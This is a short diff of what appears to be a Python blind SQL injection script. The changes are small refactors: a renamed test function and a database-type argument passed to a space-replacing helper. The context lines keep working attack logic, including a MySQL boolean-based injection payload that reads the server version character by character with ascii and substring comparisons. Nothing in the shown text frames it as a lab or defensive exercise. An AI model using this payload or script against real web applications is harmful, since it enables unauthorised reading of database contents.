@@ -57,7 +57,7 @@ def execText(ip, inj_str, noSpace=True):
     if noSpace:
         inj_str = replaceSpace(inj_str)
 
-    test = test_sqli(ip, inj_str)
+    test = testSQLi(ip, inj_str)
 
     if test:
         print("Possible SQLi Found.")
@@ -89,7 +89,7 @@ def extractVersion(ip, type='mysql', noSpaces=True):
         if (type == 'mysql'):
             injection_string = "test') or (ascii(substring((select version()),%d,1)))=[CHAR]%%23" % i
         if noSpaces:
-            injection_string = replaceSpace(injection_string)
+            injection_string = replaceSpace(injection_string, type=type)
      
         extracted_char = chr(extractVersionChar(ip, injection_string))   
         sys.stdout.write(extracted_char)
